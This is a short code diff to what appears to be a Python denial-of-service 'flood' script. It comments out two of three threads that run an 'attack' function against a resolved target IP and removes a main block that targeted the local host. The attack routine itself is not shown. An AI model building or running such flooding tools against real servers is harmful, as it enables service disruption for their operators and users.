@@ -41,18 +41,14 @@ def flood(url):
     print("[TARGET_HOSTNAME]" + url)
     print("[TARGET_IPADDRESS]" + IPAddr)
     t1 = Thread(target=attack, args=(IPAddr,))
-    t2 = Thread(target=attack, args=(IPAddr,))
-    t3 = Thread(target=attack, args=(IPAddr,))
+    #t2 = Thread(target=attack, args=(IPAddr,))
+    #t3 = Thread(target=attack, args=(IPAddr,))
 
     t1.start()
-    t2.start()
-    t3.start()
+    #t2.start()
+    #t3.start()
 
     t1.join()
-    t2.join()
-    t3.join()
+    #t2.join()
+    #t3.join()
     print("[FINISHED]")
-
-
-if __name__ == "__main__":
-    flood(socket.gethostname())
